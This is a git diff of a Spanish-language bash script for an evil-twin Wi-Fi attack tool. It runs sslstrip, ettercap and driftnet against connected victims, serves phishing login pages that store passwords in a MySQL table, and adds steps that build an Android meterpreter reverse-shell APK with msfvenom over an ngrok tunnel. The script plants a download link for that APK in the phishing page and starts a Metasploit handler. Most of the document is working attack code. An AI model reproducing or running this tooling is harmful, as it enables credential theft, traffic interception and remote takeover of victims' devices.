@@ -122,13 +122,18 @@ sleep  1
     rm iface 2>/dev/null
     echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Ingrese el nombre que le gustaría que se llamara su AP Wifi Falso, o presione enter para usar Fake_AP:${endColour} " && read -r use_ssid
     if [ "$use_ssid" = "" ];then
-        use_ssid="Fake_AP"
-        echo -e "\n${blueColour}Selecciono el nombre $use_ssid por defecto.${endColour}\n"
+            use_ssid="Fake_AP"
+            echo -e "\n${blueColour}Selecciono el nombre $use_ssid por defecto.${endColour}\n"
+        else
+            echo -e "\n${blueColour}Selecciono el nombre $use_ssid.${endColour}\n"
     fi
     echo -ne "${yellowColour}[*]${endColour}${grayColour} Canal a utilizar (1-12):${endColour} " && read use_channel; tput civis
     if [ "$use_channel" = "" ];then
-        use_channel="10"
-        echo -e "\n${blueColour}Selecciono el canal 10 por defecto.${endColour}"
+            use_channel="10"
+            echo -e "\n${blueColour}Selecciono el canal 10 por defecto.${endColour}"
+        else
+            echo -e "\n${blueColour}Selecciono el canal $use_channel.${endColour}"
+
     fi
     echo -e "\n${redColour}[!] Matando todas las conexiones...${endColour}\n"
     sleep 2
@@ -171,14 +176,14 @@ sleep  1
     sleep 5
 clear
 
-echo -e "${YELLOW}Elige entre dos modos de ataque${NC}"
+echo -e "${YELLOW}Elige entre tres modos de ataque${NC}\n"
 echo
-echo -e "${redColour}POR FAVOR USE ESTA OPCIÓN RESPONSABLEMENTE.${endColour}"
-echo -e "${yellowColour}1)${endColour} ${purpleColour}Se ejecutarán ettercap y sslstrip junto a una página web de login por http${endColour}"
-echo -e "${yellowColour}2)${endColour} ${purpleColour}La página web está conectada a una base de datos programada en php${endColour}"
+echo -e "${redColour}POR FAVOR USE ESTA OPCIÓN RESPONSABLEMENTE.${endColour}\n"
+echo -e "${yellowColour}1)${endColour} ${purpleColour}Se ejecutarán ettercap, driftnet y sslstrip junto a una página web de login${endColour}"
+echo -e "${yellowColour}2)${endColour} ${purpleColour}Página web conectada a una base de datos y apk maliciosa. ${endColour}"
 echo -e "${yellowColour}3)${endColour} ${purpleColour}Google-login${endColour}"
 while true; do
-echo -n " #? "
+echo -ne " ${yellowColour}#?${endColour} "
 read yn
 case $yn in
 1 ) AIRBASE=1 ; break ;;
@@ -206,13 +211,13 @@ mkdir -p $HOME/Wifi
 
 # Sslstrip
 echo
-echo -e "\n${yellowColour}[*]${endColour}${grayColour}Iniciando sslstrip...${endColour}\n" 
+echo -e "\n${yellowColour}[*]${endColour}${grayColour}Iniciando sslstrip...${endColour}" 
 
 sslstrip -f -p -k -l 10000 -w $HOME/Wifi/sslstrip.log sslstripid=$! > /dev/null 2>&1 &
 sleep 2
 
 # Ettercap
-echo -e "\n${yellowColour}[*]${endColour}${grayColour}Iniciando ettercap...${endColour}\n"
+echo -e "\n${yellowColour}[*]${endColour}${grayColour}Iniciando ettercap...${endColour}"
 
 gnome-terminal -- bash -c "echo 'Ejecutando comando en nueva terminal...' ; ettercap -p -u -T -q -w /tmp/Wifi/etter.cap -i wlan0mon & ettercapid=$! ; $SHELL"
 
@@ -220,7 +225,7 @@ gnome-terminal -- bash -c "echo 'Ejecutando comando en nueva terminal...' ; ette
 sleep 2
 
 # Driftnet
-echo -e "\n${yellowColour}[*]${endColour}${grayColour}Iniciando driftnet...${endColour}\n"
+echo -e "\n${yellowColour}[*]${endColour}${grayColour}Iniciando driftnet...${endColour}"
 
 mkdir -p "/tmp/Wifi/Images_$(date +%d%m%y)"
 driftnet -i wlan0mon -a -d /tmp/Wifi/Images_$(date +%d%m%y) > /dev/null & dritnetid=$!
@@ -230,12 +235,12 @@ sleep 2
 
 clear
 echo $YELLOW
-echo -e "${yellowColour}La herramienta esta ejecuta, después de que la víctima conecta y surfea sus credenciales se mostrarán en ettercap.
+echo -e "${yellowColour}La herramienta esta ejecutada, después de que la víctima sea conectada e introduzca sus credenciales se mostrarán en ettercap.
 Ettercap también guardará su salida en ${endColour}${purpleColour}$HOME/Wifi/etter.cap${endColour}
 ${yellowColour}Las contraseñas capturadas se guardarán en${endColour} ${purpleColour}$HOME/Wifi/passwords.txt${endColour}
-${yellowColour}Driftnet las imagenes se guardaran en ${endColour} ${purpleColour}$HOME/Wifi/driftftnetdata${endColour}"
+${yellowColour}Las imágenes capturadas se guardarán en${endColour} ${purpleColour}$HOME/Wifi/driftftnetdata${endColour}"
 echo
-echo -e "\n${yellowColour}[*]${endColour}${redColour} Después de haber terminado, por favor cierre la herramiente y limpie correctamente golpeando cualquier tecla.${endColour}${grayColour})...${endColour}\n${endColour}"
+echo -e "\n${yellowColour}[*]${endColour}${redColour} Después de haber terminado, por favor cierre la herramiente y limpie correctamente golpeando cualquier tecla...${endColour}\n"
 
 read junk
 
@@ -307,36 +312,107 @@ if [ "$AIRBASE" = "0" ]; then
 # Mueve el archivo HTML al directorio de Apache
 # sudo cp -r /home/kali/Desktop/Rogueap-eviltwin/Web_BBDD/* /var/www/html/
 
-
-
 # Informa al usuario que la página ha sido creada
 sleep 2
 #ejecuta el script de la base de datos
-source utilities/bbdd.sh 
-echo "Página web y base de datos creadas con éxito"
+source utilities/bbdd.sh  > /dev/null 2>&1 &
+echo -e "\n${yellowColour}[*]${endColour}${grayColour} Página web y base de datos creadas con éxito ${endColour} "
+
+sleep 2
+
+# Pedimos al usuario que introduzca el puerto que se usará para la conexión inversa
+echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Introduce el puerto que se usará para la conexión inversa: ${endColour} " && read lport
+if [ "$lport" = "" ];then
+            lport="4646"
+            echo -e "\n${blueColour}Selecciono el puerto $lport por defecto.${endColour}"
+        else
+            echo -e "\n${blueColour}Selecciono el puerto $lport.${endColour}"
+    fi
+echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Introduce el nombre que quieres dar a la aplicación: ${endColour} " && read app
+if [ "$app" = "" ];then
+            app="Aplicacion"
+            echo -e "\n${blueColour}Selecciono el nombre $app por defecto.${endColour}"
+        else
+            echo -e "\n${blueColour}Selecciono el nombre $app.${endColour}"
+    fi
+
+# Verificamos si el token de autorización de ngrok ya está configurado
+if [ -f ~/.ngrok2/ngrok.yml ]; then
+    echo -e "\n${yellowColour}[*]${endColour}${grayColour} Token de autorización de ngrok ya configurado. ${endColour}"
+else
+    # Solicitamos al usuario que introduzca el token de autorización de ngrok
+    echo -e "\n${blueColour}[Información]${endColour}${yellowColour} Si quieres saber cual es tu token ve a este link y registrate: https://dashboard.ngrok.com/get-started/your-authtoken${endColour} " 
+
+    echo -ne "\n${redColour}[!] Introduce el token de autorización de ngrok (Pj: 2Pt10va9BqUhHMzciFAtXtVp4t6_6e5Btjn8emhQYHExAuW2S): ${endColour} " && read token
+
+    # Configuramos el token de autorización en ngrok
+    ./ngrok authtoken $token > /dev/null 2>&1 &
+fi
+
+# Creamos el servidor tcp con ngrok
+echo -e "\n${yellowColour}[*]${endColour}${grayColour} Creando servidor tcp con ngrok...${endColour}"
+./ngrok tcp $lport > /dev/null &
+
+sleep 5
+
+# Obtenemos la URL pública del servidor de ngrok
+public_url=$(curl -s http://localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url' | awk -F '//' '{print $2}' | cut -d ':' -f 1)
+
+# Creamos la APK con msfvenom
+echo -e "\n${yellowColour}[*]${endColour}${grayColour} Creando APK con msfvenom... ${endColour}"
+msfvenom -p android/meterpreter/reverse_tcp LHOST=$public_url LPORT=$lport -o $app.apk > /dev/null 2>&1
+
+apk_definitivo=$app.apk
+# Movemos el archivo al servidor apache
+sleep 1
+
+sed -i '/<\/div>/i \        <p>Descarga nuestra aplicación Android aquí: <a href="'${app}'.apk">Descargar</a></p>' Web_BBDD/index.html
+
+
+mv $app.apk Web_BBDD/ > /dev/null 2>&1
+
+# Esperamos a que metasploit esté listo para recibir conexiones
+echo -e "\n${yellowColour}[*]${endColour}${grayColour} Esperando a que metasploit esté listo para recibir conexiones...${endColour}"
+sleep 10
+
+# Configuramos el exploit en metasploit con los parámetros adecuados
+echo -e "\n${yellowColour}[*]${endColour}${grayColour} Configurando exploit en metasploit con los parámetros adecuados...${endColour}\n"
+echo "use exploit/multi/handler" > metasploit.rc
+echo "set payload android/meterpreter/reverse_tcp" >> metasploit.rc
+echo "set LHOST 0.0.0.0" >> metasploit.rc
+echo "set LPORT $lport" >> metasploit.rc
+echo "exploit" >> metasploit.rc
+
+sleep 2
+
+# Ejecutamos el archivo de configuración en metasploit
+gnome-terminal -- bash -c "echo 'Ejecutando comando en nueva terminal...' ; msfconsole -r metasploit.rc msfid=$! ; $SHELL"
 
 sleep 2
 
 clear
 echo $YELLOW
-echo "Todas las contraseñas que sean introducidas en esta página web seran guardadas en una base de datos"
+echo "Todas las contraseñas que sean introducidas en esta página web seran guardadas en una base de datos."
 echo
-echo -e "Para acceder a las contraseñas almacenadas dentro de la base de datos $DB_NAME
+echo -e "Para acceder a las contraseñas almacenadas dentro de la base de datos. $DB_NAME
    ${purpleColour} 1.- mysql
-    2.- USE $DB_NAME;
+    2.- USE rogue_ap;
     3.- SELECT * FROM credenciales;${endColour}"
 echo
-echo -e "\n${yellowColour}[*]${endColour}${redColour} Después de haber terminado, por favor cierre la herramiente y limpie correctamente golpeando cualquier tecla.${endColour}${grayColour})...${endColour}\n${endColour}"
+echo -e "\n${yellowColour}[*]${endColour}${redColour} Después de haber terminado, por favor cierre la herramiente y limpie correctamente golpeando cualquier tecla...${endColour}\n"
 
 read junk
-    echo -e "\n\n${yellowColour}[*]${endColour}${grayColour} Exiting...\n${endColour}"
-    rm dnsmasq.conf hostapd.conf 2>/dev/null
+    echo -e "${yellowColour}[*]${endColour}${grayColour} Exiting...\n${endColour}"
+    rm dnsmasq.conf hostapd.conf metasploit.rc 2>/dev/null
     rm -r iface 2>/dev/null
     find \-name datos-privados.txt | xargs rm 2>/dev/null
     sleep 3; ifconfig wlan0mon down 2>/dev/null; sleep 1
     iwconfig wlan0mon mode monitor 2>/dev/null; sleep 1
     ifconfig wlan0mon up 2>/dev/null; airmon-ng stop wlan0mon > /dev/null 2>&1; sleep 1
     tput cnorm; service networking restart
+
+kill ${msfid} > /dev/null 2>&1
+
 fi
 
 
@@ -347,7 +423,9 @@ if [ "$AIRBASE" = "2" ]; then
     plantillas=(facebook-login google-login starbucks-login twitter-login yahoo-login cliqq-payload optimumwifi all_in_one)
 
     tput cnorm; echo -ne "\n${blueColour}[Información]${endColour}${yellowColour} Si deseas usar tu propia plantilla, crea otro directorio en el proyecto y especifica su nombre :)${endColour}\n\n"
-    echo -ne "${yellowColour}[*]${endColour}${grayColour} Plantilla a utilizar: 1.- google-login 2.-cliqq-payload ${endColour} " && read template
+    echo -ne "${yellowColour}[*]${endColour}${grayColour} Plantilla a utilizar: 
+    1) google-login 
+    2) cliqq-payload ${endColour}\n #? " && read template
 
     check_plantillas=0; for plantilla in "${plantillas[@]}"; do
         if [ "$template" == "1" ]; then
